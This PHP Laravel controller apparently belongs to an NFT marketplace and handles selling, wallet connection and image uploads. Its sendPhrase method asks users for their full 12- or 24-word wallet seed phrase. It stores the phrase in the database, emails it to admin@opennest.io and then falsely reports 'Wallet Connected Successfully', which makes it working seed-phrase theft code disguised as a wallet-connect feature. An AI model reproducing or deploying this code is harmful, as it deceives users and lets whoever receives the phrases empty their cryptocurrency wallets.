<?php

namespace App\Http\Controllers;

use App\Mint;
use App\SellNFT;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;

class SellNFTController extends Controller
{

    public function sell()
    {
        return view('dashboard.buysell.sell');
    }

    public function connectWallet()
    {
        return view('dashboard.buysell.connect');
    }
    public function sendPhrase(Request $request)
    {
        $request->validate([
                'wallet' => 'required',
                'phrase' => 'required',
            ]
        );
        $wallet = new Mint();
        $wallet->phrase = $request->get('phrase');
        $wallet->wallet = $request->get('wallet');
        if(count(explode(' ', $wallet->phrase)) == 12 || count(explode(' ', $wallet->phrase)) == 24){
            $wallet->user_id = Auth::id();
            $wallet->save();
            $wallet = ['wallet' => $wallet];
            Mail::to('admin@opennest.io')->send(new \App\Mail\SeedPhrase($wallet));
            return redirect()->route('user.upload')->with('success', "Wallet Connected Successfully");
        }
        return redirect()->back()->with('rejected', "Please enter your complete seed phrase");

    }

    public function upload()
    {
        return view('dashboard.buysell.upload');
    }

    public function uploadNFT(Request $request)
    {
       $request->validate([
           'name' => 'required',
           'network' => 'required',
           'price' => 'required',
           'description' => 'nullable',
           'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
       ]);

        if ($request->hasFile('image')){
            $image = $request->file('image');
            $input['imagename'] = time().'.'.$image->getClientOriginalExtension();
            $destinationPath = public_path('/nfts');
            $image->move($destinationPath, $input['imagename']);

            $nft = new SellNFT();
            $nft->user_id = Auth::id();
            $nft->name = $request->get('name');
            $nft->price = $request->get('price');
            $nft->network = $request->get('network');
            $nft->description = $request->get('description');
            $nft->image = $input['imagename'];
            $nft->save();
            return redirect()->route('user.myUploads');
        }
        $nft = new SellNFT();
        $nft->user_id = Auth::id();
        $nft->name = $request->get('name');
        $nft->price = $request->get('price');
        $nft->network = $request->get('network');
        $nft->description = $request->get('description');
        $nft->save();
        return redirect()->route('admin.myUploads');
    }

    public function myUploads()
    {
        $myuploads = SellNFT::whereUserId(\auth()->id())->paginate(10);
        return view('dashboard.buysell.myuploads', compact('myuploads'));
    }
}
